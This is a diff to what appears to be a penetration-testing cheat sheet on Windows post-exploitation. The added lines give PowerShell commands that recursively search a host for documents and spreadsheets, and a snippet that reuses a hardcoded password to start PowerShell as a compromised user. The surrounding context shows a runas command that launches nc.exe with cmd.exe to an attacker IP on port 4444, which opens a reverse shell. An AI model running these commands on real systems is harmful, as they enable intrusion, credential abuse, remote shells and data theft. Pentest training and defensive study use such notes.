@@ -262,8 +262,14 @@ Find-InterestingFile -Path \\FileServer1.domain.com\S$\shares\
 ```
 
 * cmd: `dir /s /b c:\filename` find filename in c: drive recursively
-* ps: `Get-Childitem –Path C:\ -Include *filetolookfor* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue`
+* ps: `Get-ChildItem -Path c:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
 
+In the users folder look for more extensions
+
+```powershell
+
+Get-ChildItem -Path .\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
 
 ## Recycle Bin // TBD
 
@@ -697,6 +703,16 @@ C:\Windows\System32\runas.exe /noprofile /user:<username> <password> "c:\users\P
 
 # IF THE USER SAVED THE CREDENTIALS
 C:\Windows\System32\runas.exe /savecred /user:<username> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+
+# using powershell
+
+$securePassword = ConvertTo-SecureString -String "Password123" -AsPlainText -Force
+$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'user101', $securePassword
+
+Start-Process powershell.exe -Credential $credential
+
+# it is going to start a new window with powershell as compromised user
+
 ```
 
 #### Token Impersonation
